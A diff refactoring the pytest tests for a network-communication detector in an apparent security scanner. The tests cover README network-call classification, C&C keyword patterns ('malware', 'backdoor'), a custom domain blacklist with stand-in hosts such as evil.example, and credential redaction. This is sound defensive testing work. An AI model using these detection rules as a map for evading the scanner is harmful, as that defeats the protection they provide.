-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
-            "processor = AutoProcessor.from_pretrained('official/model')\n"
-            "model = AutoModel.from_pretrained('official/model')\n"
-            f"{mapping_flow}"
-            "model.generate(**device_inputs)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_detached_transfer_alias_allowed(mapping_flow)
 
     @pytest.mark.parametrize(
         "mapping_flow",
@@ -6789,21 +6606,7 @@ class TestNetworkCommDetector:
         self,
         mapping_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom PIL import Image\n"
-            "from transformers import AutoModel, AutoProcessor\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
-            "processor = AutoProcessor.from_pretrained('official/model')\n"
-            "model = AutoModel.from_pretrained('official/model')\n"
-            f"{mapping_flow}"
-            "model.generate(**device_inputs)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_live_transfer_alias_detected(mapping_flow)
 
     @pytest.mark.parametrize(
         "mapping_flow",
@@ -6846,22 +6649,7 @@ class TestNetworkCommDetector:
         self,
         mapping_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom PIL import Image\n"
-            "from transformers import AutoModel, AutoProcessor\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
-            "processor = AutoProcessor.from_pretrained('official/model')\n"
-            "model = AutoModel.from_pretrained('official/model')\n"
-            f"{mapping_flow}"
-            "model.generate(**device_inputs)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_detached_transfer_alias_allowed(mapping_flow)
 
     @pytest.mark.parametrize(
         "same_name_transfer",
@@ -6954,21 +6742,7 @@ class TestNetworkCommDetector:
         self,
         mapping_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom PIL import Image\n"
-            "from transformers import AutoModel, AutoProcessor\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
-            "processor = AutoProcessor.from_pretrained('official/model')\n"
-            "model = AutoModel.from_pretrained('official/model')\n"
-            f"{mapping_flow}"
-            "model.generate(**device_inputs)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_live_transfer_alias_detected(mapping_flow)
 
     def test_readme_python_example_allows_ordered_nested_standalone_mapping_transfer(self) -> None:
         """A standalone transfer may follow its binding in one supported body."""
@@ -6986,11 +6760,7 @@ class TestNetworkCommDetector:
             b"```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     def test_readme_python_example_allows_inline_transfer_of_proven_mapping(self) -> None:
         """A proven BatchEncoding may be transferred directly at generate."""
@@ -7005,11 +6775,7 @@ class TestNetworkCommDetector:
             b"model.generate(**inputs.to('cuda'))\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "transfer",
@@ -7194,11 +6960,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_network_info(data)
 
     @pytest.mark.parametrize(
         "model_setup",
@@ -7365,10 +7127,7 @@ class TestNetworkCommDetector:
             b"model.generate(**inputs)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         ("processor_binding", "inputs_binding"),
@@ -7576,18 +7335,7 @@ class TestNetworkCommDetector:
         self,
         model_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom transformers import AutoModel\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            f"{model_flow}"
-            "requests.get(image_url, stream=True)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert findings
-        assert all(finding["severity"] == "INFO" for finding in findings)
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_safe_readme_model_flow(model_flow)
 
     @pytest.mark.parametrize(
         "model_flow",
@@ -7641,17 +7389,7 @@ class TestNetworkCommDetector:
         self,
         model_flow: str,
     ) -> None:
-        data = (
-            "```python\nimport requests\nfrom transformers import AutoModel\n"
-            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
-            f"{model_flow}"
-            "requests.get(image_url, stream=True)\n```\n"
-        ).encode()
-
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_unproven_readme_model_flow(model_flow)
 
     @pytest.mark.parametrize(
         "later_operation",
@@ -7765,10 +7503,7 @@ class TestNetworkCommDetector:
             "requests.get(image_url, stream=True)\n```\n"
         ).encode()
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "alias_rebind",
@@ -7814,9 +7549,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     @pytest.mark.parametrize(
         "alias_operations",
@@ -7886,9 +7619,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     def test_readme_python_example_allows_alias_mutation_after_proven_conditional_rebind(self) -> None:
         data = (
@@ -7904,9 +7635,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     @pytest.mark.parametrize(
         "expression_rebind",
@@ -7963,10 +7692,7 @@ class TestNetworkCommDetector:
             b"model.generate(**options)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "function_definition",
@@ -8075,10 +7801,7 @@ class TestNetworkCommDetector:
             b"model.generate(**options)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     @pytest.mark.parametrize(
         "definition",
@@ -8331,9 +8054,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        _assert_readme_without_network_calls(data)
 
     @pytest.mark.parametrize(
         "additional_fence",
@@ -8377,10 +8098,7 @@ class TestNetworkCommDetector:
             b"requests.get(image_url, stream=True)\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "example.py")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "example.py")
 
     def test_readme_official_sample_image_requires_requests_import_before_call(self) -> None:
         data = (
@@ -8390,10 +8108,7 @@ class TestNetworkCommDetector:
             b"import requests\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     def test_large_readme_keeps_bounded_official_sample_image_example(self) -> None:
         data = (
@@ -8411,14 +8126,7 @@ class TestNetworkCommDetector:
         self,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        validated_examples: list[bytes] = []
-        original_validator = network_comm._is_valid_official_readme_sample_image_example
-
-        def count_validation(example: bytes, **kwargs: Any) -> bool:
-            validated_examples.append(example)
-            return original_validator(example, **kwargs)
-
-        monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
+        validated_examples = _record_image_validation(monkeypatch)
         data = (
             b"```python\nimport requests\n"
             b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
@@ -8481,10 +8189,7 @@ class TestNetworkCommDetector:
             b"```python\nimport requests\nrequests.get(image_url, stream=True)\n```\n"
         )
 
-        findings = NetworkCommDetector().scan(data, "README.md")
-
-        assert any(finding["type"] == "network_library" for finding in findings)
-        assert any(finding["type"] == "network_function" for finding in findings)
+        _assert_network_library_and_function(data, "README.md")
 
     def test_readme_official_image_does_not_suppress_requests_in_another_fence(self) -> None:
         data = (
@@ -8502,14 +8207,7 @@ class TestNetworkCommDetector:
         self,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        validated_examples: list[bytes] = []
-        original_validator = network_comm._is_valid_official_readme_sample_image_example
-
-        def count_validation(example: bytes, **kwargs: Any) -> bool:
-            validated_examples.append(example)
-            return original_validator(example, **kwargs)
-
-        monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
+        validated_examples = _record_image_validation(monkeypatch)
         example = (
             b"```python\nimport requests\n"
             b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
@@ -8726,15 +8424,8 @@ class TestNetworkCommDetector:
     def test_cc_pattern_scan_reuses_lowered_payload(self) -> None:
         """Reuse one lowercase payload view across all C&C pattern checks."""
 
-        class TrackingBytes(bytes):
-            lower_calls = 0
-
-            def lower(self) -> bytes:
-                self.lower_calls += 1
-                return super().lower()
-
         detector = NetworkCommDetector()
-        data = TrackingBytes(b'payload = {"malware": True, "backdoor": True}')
+        data = _LowerCountingBytes(b'payload = {"malware": True, "backdoor": True}')
 
         detector._scan_cc_patterns(data, "payload.bin")
 
@@ -8895,15 +8586,8 @@ class TestNetworkCommDetector:
     def test_blacklist_scan_reuses_lowered_payload(self) -> None:
         """Reuse one lowercase payload view across configured blacklist checks."""
 
-        class TrackingBytes(bytes):
-            lower_calls = 0
-
-            def lower(self) -> bytes:
-                self.lower_calls += 1
-                return super().lower()
-
         detector = NetworkCommDetector({"custom_blacklist": [b"blocked.example", b"evil.example"]})
-        data = TrackingBytes(b"https://blocked.example/payload")
+        data = _LowerCountingBytes(b"https://blocked.example/payload")
 
         detector._check_blacklist(data, "payload.bin")
 
@@ -8913,15 +8597,8 @@ class TestNetworkCommDetector:
     def test_blacklist_scan_skips_lowering_without_configured_domains(self) -> None:
         """Avoid touching payload bytes when no blacklist entries are configured."""
 
-        class TrackingBytes(bytes):
-            lower_calls = 0
-
-            def lower(self) -> bytes:
-                self.lower_calls += 1
-                return super().lower()
-
         detector = NetworkCommDetector()
-        data = TrackingBytes(b"https://blocked.example/payload")
+        data = _LowerCountingBytes(b"https://blocked.example/payload")
 
         detector._check_blacklist(data, "payload.bin")
 
@@ -9683,21 +9360,13 @@ def test_filtered_url_credentials_do_not_consume_shared_evidence_budget(
     url_template: str,
 ) -> None:
     """URL redaction must classify filtered credential-shaped domains before shared evidence."""
-    calls = 0
-    original_redactor = network_comm._redact_network_evidence
-
-    def count_shared_redaction(text: str) -> str:
-        nonlocal calls
-        calls += 1
-        return original_redactor(text)
-
-    monkeypatch.setattr(network_comm, "_redact_network_evidence", count_shared_redaction)
+    calls = _count_shared_redactions(monkeypatch)
     data = "\n".join(url_template.format(index=index) for index in range(40)).encode()
     detector = NetworkCommDetector()
 
     findings = detector.scan(data, "README.md")
 
-    assert calls == 0
+    assert calls[0] == 0
     assert detector._evidence_redaction_classifications == 0
     assert not detector._evidence_redaction_limit_reached
     assert not any(finding["type"] == "detector_finding_limit" for finding in findings)
@@ -9709,20 +9378,12 @@ def test_filtered_bare_credential_uses_shared_evidence_redaction(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
     """A bare credential-shaped domain still needs shared evidence classification."""
-    calls = 0
-    original_redactor = network_comm._redact_network_evidence
-
-    def count_shared_redaction(text: str) -> str:
-        nonlocal calls
-        calls += 1
-        return original_redactor(text)
-
-    monkeypatch.setattr(network_comm, "_redact_network_evidence", count_shared_redaction)
+    calls = _count_shared_redactions(monkeypatch)
     detector = NetworkCommDetector()
 
     findings = detector.scan(b"api_key=secret.invalid", "tokens.txt")
 
-    assert calls == 1
+    assert calls[0] == 1
     assert detector._evidence_redaction_classifications == 1
     assert not detector._evidence_redaction_limit_reached
     assert "secret.invalid" not in json.dumps(findings, sort_keys=True)
@@ -9750,3 +9411,111 @@ def test_shared_evidence_redaction_classification_budget_fails_closed(
     assert findings[-1]["type"] == "detector_finding_limit"
     assert findings[-1]["analysis_incomplete"] is True
     assert findings[-1]["max_classifications"] == network_comm._MAX_EVIDENCE_REDACTION_CLASSIFICATIONS
+
+
+def _count_shared_redactions(monkeypatch: pytest.MonkeyPatch) -> list[int]:
+    calls = [0]
+    original_redactor = network_comm._redact_network_evidence
+
+    def count_shared_redaction(text: str) -> str:
+        calls[0] += 1
+        return original_redactor(text)
+
+    monkeypatch.setattr(network_comm, "_redact_network_evidence", count_shared_redaction)
+    return calls
+
+
+def _assert_endpoint_credential_isolation(
+    data: bytes, secret: str, endpoint_type: str, endpoint_field: str, endpoint: str
+) -> None:
+    findings = NetworkCommDetector().scan(data, "hook.py")
+
+    assert secret not in json.dumps(findings, sort_keys=True)
+    assert any(finding.get("type") == endpoint_type and finding.get(endpoint_field) == endpoint for finding in findings)
+
+
+def _assert_readme_network_info(data: bytes) -> None:
+    findings = NetworkCommDetector().scan(data, "README.md")
+
+    assert findings
+    assert all(finding["severity"] == "INFO" for finding in findings)
+    assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+
+def _assert_network_library_and_function(data: bytes, filename: str) -> None:
+    findings = NetworkCommDetector().scan(data, filename)
+
+    assert any(finding["type"] == "network_library" for finding in findings)
+    assert any(finding["type"] == "network_function" for finding in findings)
+
+
+def _assert_readme_without_network_calls(data: bytes) -> None:
+    findings = NetworkCommDetector().scan(data, "README.md")
+
+    assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+
+def _assert_redacted_path_token(findings: list[dict[str, Any]], path_token: str, expected_url: str) -> None:
+    url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
+    assert url_finding["url"] == expected_url
+    assert path_token not in json.dumps(url_finding, sort_keys=True)
+
+
+def _assert_long_url_secret_isolation(case_secret: str) -> None:
+    secret = case_secret
+    data = (
+        b"https://example.com/"
+        + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
+        + f"/api_key/{secret}/model.bin".encode()
+    )
+
+    findings = NetworkCommDetector().scan(data, "hook.py")
+
+    assert secret not in json.dumps(findings, sort_keys=True)
+
+
+def _assert_serialized_path_token_isolation(findings: list[dict[str, Any]], path_token: str) -> None:
+    serialized = json.dumps(findings, sort_keys=True)
+    assert "https://example.com/download/<redacted>/model.bin" in serialized
+    assert path_token not in serialized
+
+
+def _assert_hf_repository_url(detector: NetworkCommDetector, data: bytes, repo_id: str, url_prefix: str) -> None:
+    findings = detector.scan(data, "metadata.txt")
+    url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
+    assert url_finding["url"] == f"{url_prefix}{repo_id}"
+
+
+class _LowerCountingBytes(bytes):
+    lower_calls = 0
+
+    def lower(self) -> bytes:
+        self.lower_calls += 1
+        return super().lower()
+
+
+def _record_image_validation(monkeypatch: pytest.MonkeyPatch) -> list[bytes]:
+    validated_examples: list[bytes] = []
+    original_validator = network_comm._is_valid_official_readme_sample_image_example
+
+    def count_validation(example: bytes, **kwargs: Any) -> bool:
+        validated_examples.append(example)
+        return original_validator(example, **kwargs)
+
+    monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
+    return validated_examples
+
+
+def _record_proof_budget(
+    monkeypatch: pytest.MonkeyPatch,
+) -> tuple[network_comm._ReadmeImageExampleProofBudget, list[int]]:
+    proof_budget = network_comm._ReadmeImageExampleProofBudget()
+    proof_charges: list[int] = []
+    original_consume = proof_budget.consume_named_callable
+
+    def record_proof_work(work: int) -> bool:
+        proof_charges.append(work)
+        return original_consume(work)
+
+    monkeypatch.setattr(proof_budget, "consume_named_callable", record_proof_work)
+    return proof_budget, proof_charges
